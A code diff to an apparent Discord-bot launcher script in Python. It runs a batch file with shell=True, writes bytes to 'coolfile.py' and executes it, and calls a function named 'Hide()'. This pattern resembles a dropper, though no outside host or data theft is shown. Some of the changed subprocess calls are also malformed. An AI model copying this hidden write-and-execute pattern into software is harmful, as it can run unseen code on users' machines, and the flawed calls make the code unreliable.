@@ -1,4 +1,5 @@
 import asyncio
+import filecmp
 import os
 import subprocess
 import venv
@@ -72,14 +73,39 @@ async def Activated(targetDir):
     
     return botpayload
 
+def checkfileinDir(dir: list, targFile:str) -> bool:
+    for file in dir:
+        if targFile == file:
+            print("Found {}".format(targFile))
+            return True
+            
+
 async def runBotBatch(payload):
     directory = os.listdir()
-    for i in range(len(directory)):
-        if "run_discordbot.bat" == i:
-            botFile = directory[i]
+    botFile = None
+    hopeToFindFile = "run_discordbot.bat"
+    botFile = checkfileinDir(directory, hopeToFindFile)
     
-            print(f"Running batch file: {botFile}")
+    if botFile:
+        print(f"Running batch file: {hopeToFindFile}")
+        startBot = subprocess.Popen(hopeToFindFile, shell=True, stdout=sys.stdout, stderr=sys.stderr)
+        startBot.wait()
+        print("Return code:", startBot.returncode)
+        
+    else:
+        print("Batch file run_discordbot.bat not found in the cwd: {} \n".format(os.getcwd()))
+        print(directory)
+        print("Trying again after 5 seconds...")
+        await asyncio.sleep(5)
+        botFile2 = checkfileinDir(directory, "run_discordbot.bat")
+        if botFile2:
+            startBot = subprocess.Popen(hopeToFindFile, shell=True, stdout=sys.stdout, stderr=sys.stderr)
+            startBot.wait()
+        else:
+            print("Still could not find run_discordbot.bat in the cwd {}".format(os.getcwd()))
 
+
+    
     #startBot = subprocess.run(botpayload, shell=True, capture_output=True)
     thread1 = ThreadManager.ThreadManager(target=printNewFile, args=payload, name="DiscordBot")
     thread1.start()
@@ -88,7 +114,13 @@ async def runBotBatch(payload):
 
     print("Starting the final python installer file")
     print("{0}\\venv\\Scripts\\python.exe {1}\\coolfile.py".format(os.getcwd(), os.getcwd()))
-    proc = await asyncio.create_subprocess_shell("coolfile.py", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+    proc = await asyncio.create_subprocess_exec(
+        sys.executable, 
+        "{0}\\venv\\Scripts\\python.exe".format(os.getcwd()), 
+        "{0}\\coolfile.py".format(os.getcwd()),
+        "coolfile.py", 
+        stdout=asyncio.subprocess.PIPE, 
+        stderr=asyncio.subprocess.PIPE)
     stdout, stderr = await proc.communicate()
     if stdout:
         print(stdout.decode())
@@ -135,7 +167,7 @@ if __name__ == '__main__':\r\n
     with open("coolfile.py", "wb") as file:
         file.write(fileConts)
         file.close()
-
+    print("Writing thread writing to stdout: FINISHED")
 async def main():
     
     await Hide()
